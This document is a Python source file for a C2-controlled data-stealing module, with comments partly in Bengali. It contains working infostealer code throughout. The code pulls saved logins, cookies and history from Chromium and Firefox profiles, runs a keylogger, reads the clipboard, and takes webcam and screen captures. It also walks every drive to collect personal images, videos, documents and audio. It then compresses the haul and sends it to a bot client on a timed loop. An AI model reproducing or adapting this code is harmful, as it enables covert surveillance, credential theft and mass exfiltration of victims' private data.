# -*- coding: utf-8 -*-

"""
data_steal.py – Advanced Data Stealing Module
=============================================
* Dynamic Data Collection
* Dynamic Browser Detection (যত ব্রাউজার আছে সব)
* Webcam Capture
* Dynamic File Collection (পুরো OS থেকে সব Images, Videos, Documents, Audio)
* Keylogger
* Clipboard
* System Information
* Screenshot
* FIXED: Dictionary iteration error - সম্পূর্ণ সমাধান
* FIXED: 'list' object has no attribute 'values' - DynamicFileScanner ঠিক করা
* NO FILE LIMIT - সব ফাইল সংগ্রহ করবে
* C2 Controlled - Steal চালু/বন্ধ C2 থেকে নিয়ন্ত্রণ (FIXED)
"""

import os
import sys
import json
import time
import glob
import sqlite3
import platform
import subprocess
import threading
import base64
import zlib
import shutil
import socket
import struct
from datetime import datetime
from typing import Dict, List, Any, Optional
import logging

# --------------------------------------------------------------------------- #
# Configuration
# --------------------------------------------------------------------------- #
try:
    from config import STEAL_INTERVAL
except ImportError:
    STEAL_INTERVAL = 60

try:
    from config import MAX_FILE_SIZE
except ImportError:
    MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB

# --------------------------------------------------------------------------- #
# Logging
# --------------------------------------------------------------------------- #
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('DataSteal_Module')

# --------------------------------------------------------------------------- #
# Bot Client Reference
# --------------------------------------------------------------------------- #
_bot_client = None

def set_bot_client(client):
    """Set the bot client instance for sending data"""
    global _bot_client
    _bot_client = client
    logger.info("[Stealer] Bot client reference set")


# ============================================================================ #
# 🔍 Dynamic Browser Detector - সম্পূর্ণ FIXED
# ============================================================================ #

class BrowserDetector:
    """ডায়নামিক ব্রাউজার ডিটেক্টর"""

    def __init__(self):
        self.os_name = platform.system()
        self.browsers = {}
        self.browser_paths = {}

    def detect_all_browsers(self) -> Dict:
        """সিস্টেমে যত ব্রাউজার আছে সব ডিটেক্ট করুন"""

        found_browsers = {}

        if self.os_name == "Windows":
            found_browsers = self._detect_windows_browsers()
        elif self.os_name == "Darwin":
            found_browsers = self._detect_mac_browsers()
        elif self.os_name == "Linux":
            found_browsers = self._detect_linux_browsers()

        self.browsers = found_browsers

        if self.browsers:
            logger.info(f"[BrowserDetector] Found {len(self.browsers)} browsers: {list(self.browsers.keys())}")
        else:
            logger.warning("[BrowserDetector] No browsers found!")

        return self.browsers

    def _detect_windows_browsers(self) -> Dict:
        """Windows এ ব্রাউজার ডিটেক্ট করুন"""
        local_app = os.getenv('LOCALAPPDATA')

        browser_configs = {
            'Chrome': os.path.join(local_app, 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(local_app, 'Microsoft', 'Edge', 'User Data'),
            'Brave': os.path.join(local_app, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Firefox': os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
            'Opera': os.path.join(local_app, 'Opera Software', 'Opera Stable'),
            'Vivaldi': os.path.join(local_app, 'Vivaldi', 'User Data'),
            'Chromium': os.path.join(local_app, 'Chromium', 'User Data'),
        }

        found_browsers = {}

        for browser_name, data_path in browser_configs.items():
            if os.path.exists(data_path):
                browser_type = 'chromium' if browser_name != 'Firefox' else 'firefox'
                found_browsers[browser_name] = {
                    'data_path': data_path,
                    'type': browser_type
                }
                self.browser_paths[browser_name] = data_path
                logger.info(f"[BrowserDetector] Found {browser_name}")

        return found_browsers

    def _detect_mac_browsers(self) -> Dict:
        """Mac এ ব্রাউজার ডিটেক্ট করুন"""
        home = os.path.expanduser("~")

        browser_configs = {
            'Chrome': os.path.join(home, 'Library/Application Support/Google/Chrome'),
            'Edge': os.path.join(home, 'Library/Application Support/Microsoft Edge'),
            'Brave': os.path.join(home, 'Library/Application Support/BraveSoftware/Brave-Browser'),
            'Firefox': os.path.join(home, 'Library/Application Support/Firefox/Profiles'),
            'Opera': os.path.join(home, 'Library/Application Support/com.operasoftware.Opera'),
            'Vivaldi': os.path.join(home, 'Library/Application Support/Vivaldi'),
            'Safari': os.path.join(home, 'Library/Safari'),
            'Chromium': os.path.join(home, 'Library/Application Support/Chromium'),
        }

        found_browsers = {}

        for browser_name, data_path in browser_configs.items():
            if os.path.exists(data_path):
                browser_type = 'chromium' if browser_name not in ['Firefox', 'Safari'] else 'firefox'
                found_browsers[browser_name] = {
                    'data_path': data_path,
                    'type': browser_type
                }
                self.browser_paths[browser_name] = data_path
                logger.info(f"[BrowserDetector] Found {browser_name}")

        return found_browsers

    def _detect_linux_browsers(self) -> Dict:
        """Linux এ ব্রাউজার ডিটেক্ট করুন"""
        home = os.path.expanduser("~")

        browser_configs = {
            'Chrome': os.path.join(home, '.config/google-chrome'),
            'Edge': os.path.join(home, '.config/microsoft-edge'),
            'Brave': os.path.join(home, '.config/brave-browser'),
            'Firefox': os.path.join(home, '.mozilla/firefox'),
            'Chromium': os.path.join(home, '.config/chromium'),
            'Opera': os.path.join(home, '.config/opera'),
            'Vivaldi': os.path.join(home, '.config/vivaldi'),
        }

        found_browsers = {}

        for browser_name, data_path in browser_configs.items():
            if os.path.exists(data_path):
                browser_type = 'chromium' if browser_name != 'Firefox' else 'firefox'
                found_browsers[browser_name] = {
                    'data_path': data_path,
                    'type': browser_type
                }
                self.browser_paths[browser_name] = data_path
                logger.info(f"[BrowserDetector] Found {browser_name}")

        return found_browsers


# ============================================================================ #
# 🌐 Browser Data Extractor - সম্পূর্ণ FIXED
# ============================================================================ #

class BrowserDataExtractor:
    """ডায়নামিক ব্রাউজার ডেটা এক্সট্র্যাক্টর"""

    def __init__(self):
        self.os_name = platform.system()
        self.data = {}
        self.detector = BrowserDetector()

    def _get_browser_paths(self) -> Dict:
        return self.detector.detect_all_browsers()

    def _read_sqlite(self, db_path: str) -> List[Dict]:
        if not os.path.exists(db_path):
            return []

        try:
            temp_path = db_path + ".tmp"
            shutil.copy2(db_path, temp_path)

            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            results = []

            try:
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                rows = cursor.fetchall()
                for row in rows:
                    if row[0]:
                        results.append({
                            'url': row[0],
                            'username': row[1] if row[1] else '',
                            'password': base64.b64encode(row[2]).decode() if row[2] else ''
                        })
            except:
                pass

            try:
                cursor.execute("SELECT host_key, name, value FROM cookies")
                rows = cursor.fetchall()
                for row in rows:
                    if row[0]:
                        results.append({
                            'type': 'cookie',
                            'host': row[0],
                            'name': row[1],
                            'value': row[2]
                        })
            except:
                pass

            try:
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                rows = cursor.fetchall()
                for row in rows:
                    if row[0]:
                        results.append({
                            'type': 'history',
                            'url': row[0],
                            'title': row[1] if row[1] else '',
                            'last_visit': row[2]
                        })
            except:
                pass

            conn.close()
            os.remove(temp_path)
            return results

        except Exception as e:
            logger.error(f"Error reading {db_path}: {e}")
            return []

    def extract_browser_data(self, browser_name: str, data_path: str, browser_type: str) -> Dict:
        if not data_path or not os.path.exists(data_path):
            return {}

        result = {
            'browser': browser_name,
            'type': browser_type,
            'logins': [],
            'cookies': [],
            'history': [],
            'total_logins': 0,
            'total_cookies': 0,
            'total_history': 0,
            'data_path': data_path
        }

        try:
            if browser_type == 'chromium':
                login_db = os.path.join(data_path, 'Default', 'Login Data')
                cookies_db = os.path.join(data_path, 'Default', 'Cookies')

                logins = self._read_sqlite(login_db)
                cookies = self._read_sqlite(cookies_db)

                for item in logins:
                    if item.get('type') == 'cookie':
                        result['cookies'].append(item)
                    elif item.get('type') == 'history':
                        result['history'].append(item)
                    else:
                        result['logins'].append(item)

                for item in cookies:
                    if item.get('type') == 'cookie':
                        result['cookies'].append(item)
                    elif item.get('type') == 'history':
                        result['history'].append(item)
                    else:
                        result['logins'].append(item)

                history_db = os.path.join(data_path, 'Default', 'History')
                history_items = self._read_sqlite(history_db)
                for item in history_items:
                    if item.get('type') == 'history':
                        result['history'].append(item)

            elif browser_type == 'firefox':
                if os.path.exists(data_path):
                    for folder in glob.glob(os.path.join(data_path, '*.default*')):
                        login_json = os.path.join(folder, 'logins.json')
                        cookies_sqlite = os.path.join(folder, 'cookies.sqlite')

                        if os.path.exists(login_json):
                            try:
                                with open(login_json, 'r', encoding='utf-8') as f:
                                    data = json.load(f)
                                    result['logins'].append({
                                        'source': 'firefox_login',
                                        'data': base64.b64encode(json.dumps(data).encode()).decode()
                                    })
                            except:
                                pass

                        if os.path.exists(cookies_sqlite):
                            cookies = self._read_sqlite(cookies_sqlite)
                            for item in cookies:
                                if item.get('type') == 'cookie':
                                    result['cookies'].append(item)
        except Exception as e:
            logger.error(f"Error extracting {browser_name}: {e}")

        result['total_logins'] = len(result['logins'])
        result['total_cookies'] = len(result['cookies'])
        result['total_history'] = len(result['history'])

        return result

    def run(self) -> Dict:
        """সব ব্রাউজার থেকে ডেটা সংগ্রহ করুন"""
        logger.info("[Browser] Starting extraction...")

        browsers = self._get_browser_paths()

        if not browsers:
            logger.warning("[Browser] No browsers found!")
            return {}

        extracted_data = {}

        for browser_name, browser_info in list(browsers.items()):
            data_path = browser_info.get('data_path')
            browser_type = browser_info.get('type', 'chromium')

            if data_path:
                try:
                    data = self.extract_browser_data(browser_name, data_path, browser_type)
                    if data and (data.get('logins') or data.get('cookies') or data.get('history')):
                        extracted_data[browser_name] = data
                        logger.info(f"[Browser] {browser_name}: {data.get('total_logins', 0)} logins, {data.get('total_cookies', 0)} cookies, {data.get('total_history', 0)} history")
                except Exception as e:
                    logger.error(f"[Browser] Error extracting {browser_name}: {e}")

        self.data = extracted_data
        return self.data

    def get_browser_list(self) -> List[str]:
        return list(self.data.keys())


# ============================================================================ #
# 🖥️ System Drive Detector
# ============================================================================ #

class SystemDriveDetector:
    """সিস্টেমের সব ড্রাইভ ডিটেক্ট করুন"""

    @staticmethod
    def get_all_drives() -> List[str]:
        drives = []

        if platform.system() == "Windows":
            import string
            for letter in string.ascii_uppercase:
                drive = f"{letter}:\\"
                if os.path.exists(drive):
                    drives.append(drive)
        else:
            drives = ['/']

        return drives


# ============================================================================ #
# 📁 Dynamic File Scanner - সব ফাইল নেওয়া হবে (FIXED)
# ============================================================================ #

class DynamicFileScanner:
    """ডায়নামিক ফাইল স্ক্যানার - সব ফাইল সংগ্রহ করবে"""

    IMAGE_EXTENSIONS = {
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.tif',
        '.webp', '.svg', '.ico', '.raw', '.cr2', '.nef', '.arw',
        '.heic', '.heif', '.psd', '.ai', '.eps'
    }

    VIDEO_EXTENSIONS = {
        '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm',
        '.m4v', '.mpg', '.mpeg', '.3gp', '.ogv', '.ts', '.mts',
        '.vob', '.swf', '.rm', '.rmvb'
    }

    DOCUMENT_EXTENSIONS = {
        '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
        '.txt', '.rtf', '.odt', '.ods', '.odp', '.csv', '.tsv',
        '.md', '.tex', '.log', '.xml', '.html', '.htm', '.css',
        '.js', '.json', '.yaml', '.yml', '.toml', '.ini', '.cfg'
    }

    AUDIO_EXTENSIONS = {
        '.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a',
        '.alac', '.aiff', '.opus', '.amr'
    }

    def __init__(self):
        self.os_name = platform.system()
        self.max_file_size = MAX_FILE_SIZE  # 10MB

    def _get_extensions(self, file_type: str) -> set:
        """ফাইল টাইপ অনুযায়ী extensions ফেরত দেয়"""
        if file_type == 'images':
            return self.IMAGE_EXTENSIONS
        elif file_type == 'videos':
            return self.VIDEO_EXTENSIONS
        elif file_type == 'documents':
            return self.DOCUMENT_EXTENSIONS
        elif file_type == 'audio':
            return self.AUDIO_EXTENSIONS
        else:
            return (self.IMAGE_EXTENSIONS | self.VIDEO_EXTENSIONS |
                   self.DOCUMENT_EXTENSIONS | self.AUDIO_EXTENSIONS)

    def scan_drive(self, drive_path: str, extensions: set) -> Dict:
        """একটি ড্রাইভ সম্পূর্ণ স্ক্যান করুন - সব ফাইল নিবে"""
        results = {}

        ignore_dirs = {
            'Windows', 'System32', 'System', 'Program Files',
            'Program Files (x86)', 'WinSxS', 'Temp', 'tmp',
            '$Recycle.Bin', 'System Volume Information',
            'AppData', 'Application Data', 'Local Settings',
            'Microsoft', 'Microsoft.NET', 'MSBuild', 'NuGet'
        }

        try:
            for root, dirs, files in os.walk(drive_path, topdown=True):
                depth = root.replace(drive_path, '').count(os.sep)
                if depth > 4:
                    dirs.clear()
                    continue

                dirs[:] = [d for d in dirs if d not in ignore_dirs and not d.startswith('$') and not d.startswith('.')]

                for file in files:
                    ext = os.path.splitext(file)[1].lower()
                    if ext in extensions:
                        file_path = os.path.join(root, file)

                        try:
                            file_size = os.path.getsize(file_path)
                            if file_size > self.max_file_size or file_size == 0:
                                continue
                        except:
                            continue

                        try:
                            with open(file_path, 'rb') as f:
                                content = f.read(self.max_file_size)
                                if content:
                                    folder_name = os.path.basename(root) if root != drive_path else 'root'

                                    if folder_name not in results:
                                        results[folder_name] = []

                                    results[folder_name].append({
                                        'name': file,
                                        'path': file_path,
                                        'size': file_size,
                                        'type': ext[1:],
                                        'data': base64.b64encode(content).decode()
                                    })
                        except Exception:
                            continue
        except Exception:
            pass

        return results

    def scan_all_drives(self, file_type: str) -> Dict:
        """সব ড্রাইভ থেকে নির্দিষ্ট টাইপের ফাইল স্ক্যান করুন - সব ফাইল নিবে"""
        all_results = {}
        extensions = self._get_extensions(file_type)
        drives = SystemDriveDetector.get_all_drives()

        for drive in drives:
            try:
                logger.info(f"[Scanner] Scanning {drive} for {file_type}...")
                results = self.scan_drive(drive, extensions)
                if results:
                    all_results[drive] = results
                    # ✅ সঠিকভাবে কাউন্ট করুন
                    total = 0
                    for folder_name, files in results.items():
                        total += len(files)
                    logger.info(f"[Scanner] Found {total} {file_type} in {drive}")
            except Exception as e:
                logger.error(f"Error scanning {drive}: {e}")

        return all_results


# ============================================================================ #
# 🎥 Webcam Capture
# ============================================================================ #

class WebcamCapture:
    @staticmethod
    def capture():
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                if not cap.isOpened():
                    logger.warning("[Webcam] No webcam found")
                    return None

            time.sleep(0.5)
            ret, frame = cap.read()
            cap.release()

            if not ret:
                return None

            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
            return base64.b64encode(buffer).decode('utf-8')

        except ImportError:
            return WebcamCapture._fallback_capture()
        except Exception as e:
            logger.error(f"[Webcam] Error: {e}")
            return None

    @staticmethod
    def _fallback_capture():
        try:
            os_name = platform.system()

            if os_name == "Windows":
                cmd = '''
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                $memoryStream = New-Object IO.MemoryStream
                $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $base64 = [Convert]::ToBase64String($memoryStream.ToArray())
                Write-Output $base64
                '''
                proc = subprocess.Popen(['powershell', '-Command', cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                raw_data, _ = proc.communicate(timeout=10)
                return raw_data.decode('utf-8', errors='ignore').strip()
            else:
                return None
        except:
            return None


# ============================================================================ #
# 📸 Screenshot Manager
# ============================================================================ #

class ScreenshotManager:
    @staticmethod
    def capture() -> str:
        try:
            os_name = platform.system()
            if os_name == "Windows":
                try:
                    from PIL import ImageGrab
                    screenshot = ImageGrab.grab()
                    import io
                    buffer = io.BytesIO()
                    screenshot.save(buffer, format='PNG')
                    return base64.b64encode(buffer.getvalue()).decode('utf-8')
                except:
                    cmd = 'Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen; $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size); $memoryStream = New-Object IO.MemoryStream; $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg); $base64 = [Convert]::ToBase64String($memoryStream.ToArray()); Write-Output $base64'
                    proc = subprocess.Popen(['powershell', '-Command', cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    raw_data, _ = proc.communicate(timeout=10)
                    return raw_data.decode('utf-8', errors='ignore')
            else:
                proc = subprocess.Popen(['import', '-window', 'root', 'png:-'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                raw_data, _ = proc.communicate(timeout=10)
                return base64.b64encode(raw_data).decode('utf-8')
        except Exception as e:
            logger.error(f"[Screenshot] Error: {e}")
            return ""


# ============================================================================ #
# ⌨️ Advanced KeyLogger
# ============================================================================ #

class AdvancedKeyLogger:
    def __init__(self):
        self.keys = []
        self.is_running = False
        self.lock = threading.Lock()
        self.os_name = platform.system()

    def _log_key(self, key: str):
        with self.lock:
            if len(self.keys) > 10000:
                self.keys.pop(0)
            self.keys.append(key)

    def start(self):
        self.is_running = True
        logger.info("[KeyLogger] Started")

        if self.os_name == "Windows":
            self._start_windows_keylogger()
        else:
            self._start_unix_keylogger()

    def _start_windows_keylogger(self):
        try:
            import msvcrt
            def keylogger_thread():
                while self.is_running:
                    if msvcrt.kbhit():
                        try:
                            char = msvcrt.getch().decode('utf-8', errors='ignore')
                            if char and char not in ['\x00', '\xe0']:
                                self._log_key(char)
                        except:
                            pass
                    time.sleep(0.01)
            threading.Thread(target=keylogger_thread, daemon=True).start()
        except Exception as e:
            logger.error(f"[KeyLogger] Error: {e}")

    def _start_unix_keylogger(self):
        try:
            import pynput
            from pynput import keyboard

            def on_press(key):
                try:
                    self._log_key(key.char)
                except AttributeError:
                    self._log_key(str(key))

            listener = keyboard.Listener(on_press=on_press)
            listener.start()
        except ImportError:
            import select
            def keylogger_thread():
                while self.is_running:
                    if select.select([sys.stdin], [], [], 0.1)[0]:
                        try:
                            char = sys.stdin.read(1)
                            if char:
                                self._log_key(char)
                        except:
                            pass
                    time.sleep(0.01)
            threading.Thread(target=keylogger_thread, daemon=True).start()

    def stop(self):
        self.is_running = False
        logger.info("[KeyLogger] Stopped")

    def get_keys(self) -> str:
        with self.lock:
            data = "".join(self.keys)
            self.keys = []
            return data


# ============================================================================ #
# 📋 Clipboard Manager
# ============================================================================ #

class ClipboardManager:
    @staticmethod
    def get_clipboard_content() -> str:
        try:
            os_name = platform.system()
            if os_name == "Windows":
                try:
                    import win32clipboard
                    win32clipboard.OpenClipboard()
                    data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                    win32clipboard.CloseClipboard()
                    return data.decode('utf-8') if isinstance(data, bytes) else str(data)
                except:
                    try:
                        import pyperclip
                        return pyperclip.paste()
                    except:
                        return ""
            else:
                try:
                    if os_name == "Darwin":
                        proc = subprocess.Popen(['pbpaste'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    else:
                        proc = subprocess.Popen(['xclip', '-selection', 'clipboard', '-o'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    output, _ = proc.communicate(timeout=5)
                    return output.decode('utf-8', errors='ignore')
                except:
                    return ""
        except Exception as e:
            logger.error(f"[Clipboard] Error: {e}")
            return ""


# ============================================================================ #
# 🖥️ System Information
# ============================================================================ #

class SystemInfoCollector:
    @staticmethod
    def collect() -> Dict:
        info = {
            'os': platform.system(),
            'os_version': platform.version(),
            'os_release': platform.release(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'hostname': platform.node(),
            'platform': platform.platform(),
            'python_version': sys.version,
            'timestamp': datetime.now().isoformat()
        }
        return info


# ============================================================================ #
# 🎯 Main DataStealer Class - সম্পূর্ণ FIXED with C2 Control
# ============================================================================ #

class DataStealer:
    def __init__(self):
        self.browser_extractor = BrowserDataExtractor()
        self.file_scanner = DynamicFileScanner()
        self.keylogger = AdvancedKeyLogger()
        self.is_running = False
        self.steal_counter = 0
        self.is_enabled = True  # ✅ C2 থেকে নিয়ন্ত্রণ

    def start(self):
        self.is_running = True
        self.is_enabled = True
        self.keylogger.start()
        logger.info("[Stealer] Started")

    def stop(self):
        self.is_running = False
        self.is_enabled = False
        self.keylogger.stop()
        logger.info("[Stealer] Stopped")

    def enable(self):
        """Steal চালু করুন (C2 থেকে)"""
        self.is_enabled = True
        logger.info("[Stealer] Enabled by C2")

    def disable(self):
        """Steal বন্ধ করুন (C2 থেকে)"""
        self.is_enabled = False
        logger.info("[Stealer] Disabled by C2")

    def collect_all_data(self) -> Dict:
        logger.info("[Stealer] Collecting data...")
        self.steal_counter += 1

        try:
            logger.info("[Stealer] Scanning images from all drives...")
            images = self.file_scanner.scan_all_drives('images')
            total_images = 0
            if images:
                for drive, folders in images.items():
                    for folder_name, files in folders.items():
                        total_images += len(files)
            logger.info(f"[Stealer] Found {total_images} images")
        except Exception as e:
            logger.error(f"[Stealer] Error scanning images: {e}")
            images = {}

        try:
            logger.info("[Stealer] Scanning videos from all drives...")
            videos = self.file_scanner.scan_all_drives('videos')
            total_videos = 0
            if videos:
                for drive, folders in videos.items():
                    for folder_name, files in folders.items():
                        total_videos += len(files)
            logger.info(f"[Stealer] Found {total_videos} videos")
        except Exception as e:
            logger.error(f"[Stealer] Error scanning videos: {e}")
            videos = {}

        try:
            logger.info("[Stealer] Scanning documents from all drives...")
            documents = self.file_scanner.scan_all_drives('documents')
            total_documents = 0
            if documents:
                for drive, folders in documents.items():
                    for folder_name, files in folders.items():
                        total_documents += len(files)
            logger.info(f"[Stealer] Found {total_documents} documents")
        except Exception as e:
            logger.error(f"[Stealer] Error scanning documents: {e}")
            documents = {}

        try:
            logger.info("[Stealer] Scanning audio from all drives...")
            audio = self.file_scanner.scan_all_drives('audio')
            total_audio = 0
            if audio:
                for drive, folders in audio.items():
                    for folder_name, files in folders.items():
                        total_audio += len(files)
            logger.info(f"[Stealer] Found {total_audio} audio files")
        except Exception as e:
            logger.error(f"[Stealer] Error scanning audio: {e}")
            audio = {}

        # Browser data
        try:
            browsers = self.browser_extractor.run()
        except Exception as e:
            logger.error(f"[Stealer] Error extracting browsers: {e}")
            browsers = {}

        data = {
            'timestamp': datetime.now().isoformat(),
            'steal_id': self.steal_counter,
            'system_info': SystemInfoCollector.collect(),
            'keylogs': self.keylogger.get_keys(),
            'clipboard': ClipboardManager.get_clipboard_content(),
            'screenshot': ScreenshotManager.capture(),
            'webcam': WebcamCapture.capture(),
            'browsers': browsers,
            'dynamic_files': {
                'images': images,
                'videos': videos,
                'documents': documents,
                'audio': audio
            }
        }

        try:
            if browsers:
                data['browsers_found'] = list(browsers.keys())
                data['total_browsers'] = len(browsers)
        except:
            pass

        total_files = 0
        for category in ['images', 'videos', 'documents', 'audio']:
            count = 0
            try:
                for drive in data['dynamic_files'][category]:
                    for folder_name, files in data['dynamic_files'][category][drive].items():
                        count += len(files)
                total_files += count
                data['dynamic_files'][f'{category}_count'] = count
            except Exception as e:
                logger.error(f"Error counting {category}: {e}")
                data['dynamic_files'][f'{category}_count'] = 0

        data['total_dynamic_files'] = total_files

        total_size = len(json.dumps(data))
        logger.info(f"[Stealer] Total data size: {total_size:,} bytes (Files: {total_files})")
        return data

    def send_payload(self, data: Dict) -> bool:
        global _bot_client
        try:
            json_data = json.dumps(data, ensure_ascii=False)
            if len(json_data) > 100 * 1024:
                logger.info(f"[Stealer] Compressing {len(json_data):,} bytes...")
                compressed = zlib.compress(json_data.encode())
                compressed_b64 = base64.b64encode(compressed).decode()
                final_data = f"COMPRESSED:{compressed_b64}"
            else:
                final_data = base64.b64encode(json_data.encode()).decode()

            if _bot_client and hasattr(_bot_client, '_send'):
                result = _bot_client._send(f"STEAL_DATA {final_data}")
                if result:
                    logger.info(f"[Stealer] Payload sent ({len(final_data):,} bytes)")
                    return True
            return False
        except Exception as e:
            logger.error(f"[Stealer] Send error: {e}")
            return False

    # ✅ FIXED: run_loop with C2 control
    def run_loop(self):
        logger.info("[Stealer] Loop started")
        while self.is_running:
            try:
                # ✅ Check if steal is enabled by C2
                if not self.is_enabled:
                    logger.info("[Stealer] Steal is disabled by C2, waiting...")
                    time.sleep(5)
                    continue

                data = self.collect_all_data()
                if self.send_payload(data):
                    logger.info("[Stealer] Payload sent successfully")
                time.sleep(STEAL_INTERVAL)
            except Exception as e:
                logger.error(f"[Stealer] Loop error: {e}")
                time.sleep(10)


# ============================================================================ #
# Global Functions - সম্পূর্ণ FIXED
# ============================================================================ #

stealer = DataStealer()
_steal_thread = None

def start_data_steal(bot_client=None):
    global _steal_thread, _bot_client
    if bot_client:
        set_bot_client(bot_client)

    if not stealer.is_running:
        stealer.start()
        if _steal_thread is None or not _steal_thread.is_alive():
            _steal_thread = threading.Thread(target=stealer.run_loop, daemon=True)
            _steal_thread.start()
        logger.info("[Stealer] Service started")
        return True
    return False

def stop_data_steal():
    global _steal_thread
    stealer.stop()
    _steal_thread = None
    logger.info("[Stealer] Service stopped")
    return True

def enable_steal():
    """Steal চালু করুন (C2 থেকে)"""
    stealer.enable()
    logger.info("[Stealer] Enabled by C2")
    return True

def disable_steal():
    """Steal বন্ধ করুন (C2 থেকে)"""
    stealer.disable()
    logger.info("[Stealer] Disabled by C2")
    return True

def send_data_to_c2(data):
    global _bot_client
    try:
        if isinstance(data, dict):
            data = json.dumps(data)
        if _bot_client and hasattr(_bot_client, '_send'):
            return _bot_client._send(f"STEAL_DATA {data}")
        return False
    except Exception as e:
        logger.error(f"Failed to send data: {e}")
        return False


if __name__ == "__main__":
    print("="*60)
    print("🧪 Testing Data Steal Module")
    print("="*60)

    detector = BrowserDetector()
    browsers = detector.detect_all_browsers()
    print(f"\n📊 Found Browsers: {list(browsers.keys())}")

    scanner = DynamicFileScanner()
    print("\n📁 Scanning files...")
    images = scanner.scan_all_drives('images')
    total = 0
    if images:
        for drive, folders in images.items():
            for folder_name, files in folders.items():
                total += len(files)
    print(f"  Images found: {total}")

    print("\n✅ Test complete!")
